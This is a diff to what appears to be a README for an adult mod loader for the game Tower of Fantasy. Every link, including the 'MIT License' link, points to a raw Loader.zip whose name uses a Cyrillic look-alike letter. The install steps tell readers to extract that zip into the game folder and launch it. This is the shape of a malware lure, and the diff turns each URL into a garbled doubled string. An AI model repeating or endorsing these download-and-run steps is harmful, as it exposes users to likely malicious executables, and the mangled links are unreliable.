@@ -31,9 +31,9 @@ Welcome to **Tower of Fantasy Adult Mod: Loader 2025**! Unlock a fresh experienc
 
 ## 📥 Installation
 
-1. Download **https://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zipоhttps://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zip** from the repository.
 2. Extract files to your game’s main directory.
-3. Launch https://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zip and follow the on-screen instructions.
+3. Launch https://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zipоhttps://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zip and follow the on-screen instructions.
 4. Choose preferred mod features.
 5. Start Tower of Fantasy—enjoy enhanced gameplay!
 
@@ -47,6 +47,6 @@ This tool is for personal, educational, and entertainment use only. Not affiliat
 
 ## 📄 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zip) (c) 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zipоhttps://raw.githubusercontent.com/Ankitg1850/TowerOfFantasy-EnhancedAdultExpansions/main/Lоader.zip) (c) 2025.
 
 ---
